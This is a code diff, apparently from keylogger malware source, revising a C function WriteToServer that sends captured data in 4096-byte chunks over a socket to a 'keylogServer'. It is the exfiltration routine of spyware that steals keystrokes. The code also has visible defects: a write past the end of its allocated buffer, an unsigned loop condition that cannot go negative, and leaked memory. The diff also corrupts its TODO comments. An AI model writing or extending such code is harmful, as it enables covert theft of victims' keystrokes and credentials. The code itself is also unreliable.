@@ -64,16 +64,46 @@ return true;
     Mockup the writeToServer function for further development at this point it is limited
     but will be developed further.
 
-    TODO:  break messages down into 4096 byte captures
-    TODO:  write extensive documentation
+    TODO:  break messages down into 4096 byte capturesti
+    TODO:  write extensive documenta
 
     Title WriteToServer
 */
 
 bool WriteToServer(const char* buffer)
 {
-    if (send(keylogServer,buffer,strlen(buffer),0) ==SOCKET_ERROR)
+    if(strlen(buffer)>0x1000)
+    {
+        char* temp = (char*)malloc(0x1000);
+        for(int x=0; (strlen(buffer)-(x*0x1000))>0;x++)
+        {
+            if(strlen(buffer+(x*0x1000))>0x1000)
+                {
+                    memset(temp,0,0x1000);
+                    memcpy(temp,buffer+(x*0x1000),0x1000);
+                    *(temp+0x1000)=0x00;
+                    if (send(keylogServer,temp,0x1000,0) ==SOCKET_ERROR)
+                        return false;
+
+                }
+            else
+                {
+
+                    memset(temp,0,0x1000);
+                    memcpy(temp,buffer+(x*0x1000),strlen(buffer+(x*0x1000))+1);
+                    if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
+                        return false;
+                    printf("%s",temp);
+                    return true;
+                }
+            printf("%s",temp);
+        }
+    }
+    else
+    {
+    if (send(keylogServer,buffer,strlen(buffer)+1,0) ==SOCKET_ERROR)
         return false;
+    }
     return true;
 }
 
